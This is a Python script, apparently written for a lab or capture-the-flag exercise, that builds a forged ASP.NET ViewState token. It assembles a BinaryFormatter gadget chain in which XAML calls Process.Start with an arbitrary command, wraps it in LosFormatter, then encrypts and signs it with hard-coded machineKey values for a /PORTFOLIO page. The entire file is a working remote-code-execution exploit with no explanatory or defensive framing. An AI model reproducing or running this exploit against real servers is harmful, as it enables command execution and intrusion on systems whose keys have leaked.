"""Build correct LosFormatter payload — 0x32 token, then 7-bit-length, then BinaryFormatter."""
import base64, hashlib, hmac, os, struct, sys, html
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad

def write_7bit_length(n):
    out = b""
    while n >= 0x80:
        out += bytes([(n & 0x7F) | 0x80])
        n >>= 7
    out += bytes([n])
    return out
def write_bw_string(s):
    raw = s.encode("utf-8")
    return write_7bit_length(len(raw)) + raw

def kbkdf(km, label, context, length):
    out = b""; n = (length + 63) // 64; L = length * 8
    buf = (label or b"") + b"\x00" + (context or b"") + struct.pack(">I", L)
    for i in range(1, n + 1):
        out += hmac.new(km, struct.pack(">I", i) + buf, hashlib.sha512).digest()
    return out[:length]

def build_bf(cmd, args):
    cmd_e = html.escape(cmd, quote=True)
    args_e = html.escape(args, quote=True)
    xaml = f'<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:s="clr-namespace:System;assembly=mscorlib" xmlns:r="clr-namespace:System.Diagnostics;assembly=System"><ObjectDataProvider x:Key="" ObjectType="{{x:Type r:Process}}" MethodName="Start"><ObjectDataProvider.MethodParameters><s:String>{cmd_e}</s:String><s:String>{args_e}</s:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>'
    
    buf = bytearray()
    buf += b'\x00' + struct.pack('<i', 1) + struct.pack('<i', -1) + struct.pack('<i', 1) + struct.pack('<i', 0)
    buf += b'\x0c' + struct.pack('<i', 2)
    buf += write_bw_string("Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35")
    buf += b'\x05' + struct.pack('<i', 1)
    buf += write_bw_string("Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties")
    buf += struct.pack('<i', 1)
    buf += write_bw_string("ForegroundBrush")
    buf += bytes([1])
    buf += struct.pack('<i', 2)
    buf += b'\x06' + struct.pack('<i', 3)
    buf += write_bw_string(xaml)
    buf += b'\x0b'
    return bytes(buf)

def wrap_los(bf):
    """LosFormatter: 0xff 0x01 0x32 + 7bit-len + bytes."""
    return b'\xff\x01\x32' + write_7bit_length(len(bf)) + bf

def encrypt_sign(payload, dec_key, val_key):
    primary = "WebForms.HiddenFieldPageStatePersister.ClientState"
    specifics = ["TemplateSourceDirectory: /PORTFOLIO", "Type: PORTFOLIO_DEFAULT_ASPX"]
    label = primary.encode("utf-8")
    context = b"".join(write_bw_string(s) for s in specifics)
    enc_sub = kbkdf(dec_key, label, context, len(dec_key))
    val_sub = kbkdf(val_key, label, context, len(val_key))
    iv = os.urandom(16)
    cipher = AES.new(enc_sub, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(payload, 16))
    sig = hmac.new(val_sub, iv + encrypted, hashlib.sha1).digest()
    return iv + encrypted + sig

if __name__ == "__main__":
    cmd = "cmd"
    args = sys.argv[1] if len(sys.argv) > 1 else "/c calc"
    
    bf = build_bf(cmd, args)
    los = wrap_los(bf)
    print(f"BF: {len(bf)}, LosFormatter: {len(los)}")
    
    dec_key = bytes.fromhex("74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43")
    val_key = bytes.fromhex("5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468")
    final = encrypt_sign(los, dec_key, val_key)
    final_b64 = base64.b64encode(final).decode()
    with open('/tmp/attack4.txt', 'w') as f:
        f.write(final_b64)
    print(f"Token len: {len(final_b64)}")
